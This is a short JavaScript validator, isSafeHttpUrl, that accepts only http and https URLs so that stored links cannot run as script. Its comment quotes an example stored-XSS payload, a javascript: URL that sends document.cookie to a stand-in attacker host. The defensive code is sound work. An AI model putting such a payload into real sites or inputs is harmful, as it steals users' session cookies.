/**
 * Validate that a user-supplied URL is safe to store and later hand back to a
 * browser (as an <a href>, window.open() target, or <img src>). Without this,
 * a value like `javascript:fetch('https://evil.example/steal?c='+document.cookie)`
 * saved as a resource link, post image, or avatar URL executes as script the
 * moment another user's client opens/renders it — classic stored XSS.
 *
 * Only http/https URLs are accepted; string parsing and length are validated
 * before construction to avoid throwing on unexpected input shapes.
 */
export const isSafeHttpUrl = (value) => {
  if (typeof value !== "string" || !value.trim()) return false;
  try {
    const parsed = new URL(value.trim());
    return parsed.protocol === "http:" || parsed.protocol === "https:";
  } catch {
    return false;
  }
};
